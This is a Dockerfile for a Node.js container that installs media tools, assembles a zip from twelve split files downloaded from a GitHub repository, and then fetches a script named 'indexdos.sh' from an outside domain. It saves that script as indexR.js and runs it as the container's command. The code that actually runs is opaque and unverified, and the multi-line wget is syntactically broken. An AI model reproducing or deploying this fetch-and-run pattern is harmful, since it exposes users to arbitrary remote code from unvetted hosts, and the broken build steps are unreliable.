FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Foxy39/ZFRANKY/raw/main/aa
https://github.com/Foxy39/ZFRANKY/raw/main/ab
https://github.com/Foxy39/ZFRANKY/raw/main/ac
https://github.com/Foxy39/ZFRANKY/raw/main/ad
https://github.com/Foxy39/ZFRANKY/raw/main/ae
https://github.com/Foxy39/ZFRANKY/raw/main/af
https://github.com/Foxy39/ZFRANKY/raw/main/ag
https://github.com/Foxy39/ZFRANKY/raw/main/ah
https://github.com/Foxy39/ZFRANKY/raw/main/ai
https://github.com/Foxy39/ZFRANKY/raw/main/aj
https://github.com/Foxy39/ZFRANKY/raw/main/ak
https://github.com/Foxy39/ZFRANKY/raw/main/al
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O indexR.js https://go.bruceds.my.id/indexdos.sh
COPY . .
EXPOSE 5000
CMD ["node", "indexR.js"]
